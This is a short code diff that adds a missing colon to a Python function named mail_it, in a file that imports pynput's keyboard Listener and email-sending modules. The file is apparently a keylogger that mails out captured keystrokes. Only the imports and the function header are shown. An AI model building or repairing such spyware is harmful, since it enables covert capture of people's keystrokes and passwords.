@@ -4,7 +4,7 @@ from pynput.keyboard import Key, Listener
 global counter
 
 
-def mail_it()
+def mail_it():
 	import smtplib
 	from email.mime.text import MIMEText
 	from email.mime.multipart import MIMEMultipart
